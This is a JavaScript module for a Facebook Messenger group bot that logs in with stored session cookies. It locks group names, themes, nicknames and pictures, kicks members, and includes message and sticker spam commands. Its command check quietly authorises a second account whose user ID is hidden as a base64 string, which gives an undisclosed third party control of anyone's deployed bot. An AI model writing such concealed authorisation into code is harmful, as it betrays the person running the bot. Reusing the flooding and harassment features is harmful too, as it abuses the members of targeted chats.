const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

const LOCK_FILE = "locks.json";
let locks = { groupNames: {}, themes: {}, emojis: {}, dp: {}, nick: {} };
if (fs.existsSync(LOCK_FILE)) {
  try { locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8")); } catch {}
}
function saveLocks() { fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2)); }

function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, res => {
    res.pipe(file);
    file.on("finish", () => file.close(cb));
  }).on("error", err => {
    fs.unlink(dest, () => {});
    cb(err);
  });
}

let rkbInterval = null;
let stopRequested = false;
let stickerInterval = null;
let stickerLoopActive = false;
let targetUID = null;

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData, type } = event;

        // === Locks Revert ===
        if (logMessageType === "log:thread-name" && locks.groupNames[threadID]) {
          if (logMessageData?.name !== locks.groupNames[threadID]) {
            await api.setTitle(locks.groupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }
        if (logMessageType === "log:thread-color" && locks.themes[threadID]) {
          if (logMessageData?.theme_color !== locks.themes[threadID]) {
            await api.changeThreadColor(locks.themes[threadID], threadID);
            console.log(`🎨 Theme reverted in ${threadID}`);
          }
        }
        if (logMessageType === "log:thread-icon" && locks.emojis[threadID]) {
          if (logMessageData?.thread_icon !== locks.emojis[threadID]) {
            await api.changeThreadEmoji(locks.emojis[threadID], threadID);
            console.log(`😀 Emoji reverted in ${threadID}`);
          }
        }
        if (logMessageType === "log:user-nickname") {
          const { participant_id, nickname } = logMessageData;
          if (locks.nick[participant_id]?.[threadID]) {
            const lockedNick = locks.nick[participant_id][threadID];
            if (nickname !== lockedNick) {
              await api.changeNickname(lockedNick, threadID, participant_id);
              console.log(`🔒 Nickname reverted for UID ${participant_id}`);
            }
          }
        }
        if (logMessageType === "log:thread-image" && locks.dp[threadID]) {
          try {
            const dpPath = locks.dp[threadID].path;
            if (fs.existsSync(dpPath)) {
              await api.changeGroupImage(fs.createReadStream(dpPath), threadID);
              console.log(`🖼 Group DP reverted in ${threadID}`);
            }
          } catch (e) { console.log("⚠️ DP revert failed:", e.message); }
        }

        // === Commands ===
        if (type !== "message" || !body) return;
        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // Help
        if (cmd === "/help") {
          const helpMsg = `
📖 Commands:
/gclock [text] → Group name lock
/unlockgc → Unlock group name
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/locknick @mention nickname → Nickname lock
/unlocknick @mention → Unlock nick
/dplock → Lock current group DP
/unlockdp → Unlock group DP
/allname [nick] → Sabka nickname change
/uid → Group ID
/tid → Thread ID
/exit → Bot group exit
/kick @mention → Kick member
/info @mention → User info
/rkb [name] → Line by line spam
/stop → Stop spam
/stickerX → Sticker spam (X=seconds)
/stopsticker → Stop sticker spam
/target [uid] → Set target UID
/cleartarget → Clear target
          `;
          return api.sendMessage(helpMsg, threadID);
        }

        // === Lock Commands ===
        else if (cmd === "/gclock") {
          if (!input) return api.sendMessage("❌ Group name do!", threadID);
          await api.setTitle(input, threadID);
          locks.groupNames[threadID] = input; saveLocks();
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "/unlockgc") {
          delete locks.groupNames[threadID]; saveLocks();
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }
        else if (cmd === "/locktheme") {
          if (!input) return api.sendMessage("❌ Color code do!", threadID);
          await api.changeThreadColor(input, threadID);
          locks.themes[threadID] = input; saveLocks();
          api.sendMessage("🎨 Theme locked!", threadID);
        }
        else if (cmd === "/unlocktheme") {
          delete locks.themes[threadID]; saveLocks();
          api.sendMessage("🎨 Theme unlocked!", threadID);
        }
        else if (cmd === "/lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          await api.changeThreadEmoji(input, threadID);
          locks.emojis[threadID] = input; saveLocks();
          api.sendMessage("😀 Emoji locked!", threadID);
        }
        else if (cmd === "/unlockemoji") {
          delete locks.emojis[threadID]; saveLocks();
          api.sendMessage("😀 Emoji unlocked!", threadID);
        }
        else if (cmd === "/locknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0)
            return api.sendMessage("❌ Mention karo!", threadID);
          const mentionUID = Object.keys(event.mentions)[0];
          const nickname = args.slice(2).join(" ");
          if (!nickname) return api.sendMessage("❌ Nickname do!", threadID);
          if (!locks.nick[mentionUID]) locks.nick[mentionUID] = {};
          locks.nick[mentionUID][threadID] = nickname;
          await api.changeNickname(nickname, threadID, mentionUID);
          saveLocks();
          api.sendMessage(`🔒 Nickname locked for <@${mentionUID}> → ${nickname}`, threadID);
        }
        else if (cmd === "/unlocknick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0)
            return api.sendMessage("❌ Mention karo!", threadID);
          const mentionUID = Object.keys(event.mentions)[0];
          if (locks.nick[mentionUID]) delete locks.nick[mentionUID][threadID];
          saveLocks();
          api.sendMessage(`🔓 Nickname unlocked for <@${mentionUID}>`, threadID);
        }
        else if (cmd === "/dplock") {
          const info = await api.getThreadInfo(threadID);
          if (info.imageSrc) {
            const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
            downloadFile(info.imageSrc, dpPath, err => {
              if (!err) {
                locks.dp[threadID] = { path: dpPath };
                saveLocks();
                api.sendMessage("🖼 DP locked!", threadID);
              } else api.sendMessage("❌ DP save failed", threadID);
            });
          } else api.sendMessage("❌ No DP found!", threadID);
        }
        else if (cmd === "/unlockdp") {
          delete locks.dp[threadID]; saveLocks();
          api.sendMessage("🖼 DP unlocked!", threadID);
        }

        // === Utility Commands ===
        else if (cmd === "/allname") {
          const info = await api.getThreadInfo(threadID);
          for (const uid of info.participantIDs) {
            try { await api.changeNickname(input, threadID, uid); } catch {}
          }
          api.sendMessage("✅ Done nicknames!", threadID);
        }
        else if (cmd === "/uid") api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
        else if (cmd === "/tid") api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);
        else if (cmd === "/exit") {
          try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {}
        }
        else if (cmd === "/kick") {
          if (!event.mentions || Object.keys(event.mentions).length === 0)
            return api.sendMessage("❌ Mention karo!", threadID);
          const uid = Object.keys(event.mentions)[0];
          try { await api.removeUserFromGroup(uid, threadID); api.sendMessage(`👢 Kicked <@${uid}>`, threadID); } catch {}
        }
        else if (cmd === "/info") {
          if (!event.mentions || Object.keys(event.mentions).length === 0)
            return api.sendMessage("❌ Mention karo!", threadID);
          const uid = Object.keys(event.mentions)[0];
          const userInfo = await api.getUserInfo(uid);
          const u = userInfo[uid];
          api.sendMessage(`ℹ️ Name: ${u.name}\n🆔 UID: ${uid}`, threadID);
        }

        // === Spam / Sticker Commands ===
        else if (cmd === "/rkb") {
          if (!input) return api.sendMessage("❌ Name do spam ke liye!", threadID);
          stopRequested = false;
          rkbInterval = setInterval(() => {
            if (stopRequested) { clearInterval(rkbInterval); return; }
            api.sendMessage(input, threadID);
          }, 1000);
          api.sendMessage("⚡ Spam started!", threadID);
        }
        else if (cmd === "/stop") {
          stopRequested = true;
          if (rkbInterval) clearInterval(rkbInterval);
          if (stickerInterval) clearInterval(stickerInterval);
          api.sendMessage("🛑 Spam stopped!", threadID);
        }
        else if (cmd.startsWith("/sticker")) {
          const sec = parseInt(cmd.replace("/sticker", "")) || 2;
          stickerLoopActive = true;
          stickerInterval = setInterval(() => {
            if (!stickerLoopActive) { clearInterval(stickerInterval); return; }
            api.sendMessage({ sticker: "745262147632873" }, threadID); // Example sticker ID
          }, sec * 1000);
          api.sendMessage(`⚡ Sticker spam started every ${sec} sec!`, threadID);
        }
        else if (cmd === "/stopsticker") {
          stickerLoopActive = false;
          if (stickerInterval) clearInterval(stickerInterval);
          api.sendMessage("🛑 Sticker spam stopped!", threadID);
        }
        else if (cmd === "/target") {
          targetUID = input.trim();
          api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
        }
        else if (cmd === "/cleartarget") {
          targetUID = null;
          api.sendMessage("🎯 Target cleared!", threadID);
        }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
